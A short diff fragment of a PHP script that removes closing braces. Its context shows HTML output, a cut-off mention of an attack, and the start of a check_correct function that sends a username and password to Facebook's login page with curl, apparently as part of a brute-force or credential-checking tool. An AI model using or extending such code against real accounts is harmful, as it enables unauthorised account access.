@@ -26,7 +26,6 @@ while(True)
 </table>
 </body>
 </html>");
-        }
     }
     echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
     <tr>
@@ -39,8 +38,6 @@ ce attack.</b></div>
 }
 echo "</body>
 </html>";
-   }
-}
 function check_correct($username, $Pass)
 {
 	$c = curl_init('https://www.facebook.com/login');
